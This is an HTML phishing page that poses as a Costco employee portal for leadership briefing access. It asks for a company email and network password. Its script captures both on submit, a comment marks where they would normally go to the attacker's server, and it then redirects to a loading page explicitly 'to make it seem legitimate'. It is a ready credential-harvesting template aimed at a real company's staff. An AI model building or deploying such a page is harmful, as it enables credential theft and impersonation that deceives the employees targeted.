<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Costco Employee Portal - Leadership Briefing Access</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            width: 400px;
            padding: 30px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            height: 60px;
        }
        h1 {
            color: #003da6;
            font-size: 24px;
            text-align: center;
            margin-bottom: 20px;
        }
        .confidential {
            background-color: #f8f0e3;
            border-left: 4px solid #cf472a;
            padding: 10px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #333;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            margin-bottom: 5px;
            color: #555;
        }
        input {
            padding: 12px 15px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            background-color: #003da6;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #002d7a;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #777;
        }
        .leadership-badge {
            background-color: #003da6;
            color: white;
            font-size: 12px;
            padding: 3px 8px;
            border-radius: 10px;
            display: inline-block;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="costco.png" alt="Costco Wholesale">
        </div>
        
        <div class="leadership-badge">LEADERSHIP ACCESS</div>
        
        <h1>Q2 Confidential Briefing</h1>
        
        <div class="confidential">
            This portal contains confidential information intended only for authorized personnel. Unauthorized access is prohibited.
        </div>
        
        <form id="loginForm">
            <label for="email">Costco Employee Email</label>
            <input type="email" id="email" name="email" placeholder="youremail@costco.com" required>
            
            <label for="password">Costco Network Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>
            
            <button type="submit">Access Briefing Materials</button>
        </form>
        
        <div class="footer">
            <p>Â© 2025 Costco Wholesale. Internal use only.</p>
            <p>System access monitored. Last updated: March 30, 2025</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Here you would normally send the credentials to your server
            // For this demonstration, we're just showing what would happen
            console.log("Captured credentials:", email, password);
            
            // Redirect to a "loading" or "thank you" page to make it seem legitimate
            window.location.href = "loading.html";
        });
    </script>
</body>
</html>
